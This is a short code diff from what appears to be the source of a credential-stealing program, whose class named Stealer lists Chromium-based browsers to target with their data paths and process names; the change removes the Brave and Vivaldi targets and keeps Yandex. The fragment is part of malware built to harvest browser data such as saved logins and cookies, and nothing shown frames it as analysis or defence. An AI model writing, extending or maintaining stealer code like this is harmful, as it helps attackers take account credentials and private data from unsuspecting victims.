@@ -109,26 +109,6 @@ class Stealer(Thread):
             {
                 "object": Chromium,
                 "arguments": (
-                    Browsers.BRAVE.value,
-                    self.__config.BrowsersData[Browsers.BRAVE]["path"],
-                    self.__config.BrowsersData[Browsers.BRAVE]["process"],
-                    browser_functions,
-                ),
-                "status": browser_statuses,
-            },
-            {
-                "object": Chromium,
-                "arguments": (
-                    Browsers.VIVALDI.value,
-                    self.__config.BrowsersData[Browsers.VIVALDI]["path"],
-                    self.__config.BrowsersData[Browsers.VIVALDI]["process"],
-                    browser_functions,
-                ),
-                "status": browser_statuses,
-            },
-            {
-                "object": Chromium,
-                "arguments": (
                     Browsers.YANDEX.value,
                     self.__config.BrowsersData[Browsers.YANDEX]["path"],
                     self.__config.BrowsersData[Browsers.YANDEX]["process"],
